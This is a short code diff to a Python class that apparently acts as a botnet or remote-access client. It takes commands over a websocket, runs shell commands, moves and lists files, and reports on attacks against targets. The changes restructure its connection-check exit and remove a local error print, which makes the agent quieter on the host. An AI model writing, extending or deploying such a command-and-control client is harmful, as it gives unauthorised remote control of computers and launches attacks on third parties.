@@ -71,11 +71,7 @@ class LinuxImpl:
                 open_timeout=30
             ) as ws:
                 self.retry_count = 0  
-                                
-                rec = await asyncio.wait_for(ws.recv(), timeout=60)
 
-                if "Invalid conection" in str(rec).strip():
-                    sys.exit(0)
                 
                 while self.running:
                     try:
@@ -98,6 +94,8 @@ class LinuxImpl:
                 await self._execute_command(ws, data['cmd'])
             elif 'chunk' in data:
                 await self._handle_file_upload(ws, data)
+            elif "Invalid conection" in data:
+                sys.exit(0)
             elif 'list_files' in data:
                 await self._list_directory(ws, data.get('path', self.current_dir))
             elif 'get_files' in data:
@@ -439,7 +437,6 @@ class LinuxImpl:
             else:
                 pass
         except Exception as e:
-            print(e)
             asyncio.run_coroutine_threadsafe(
                 self._notify_attack_error(ws, target, attack_type, str(e)),
                 loop
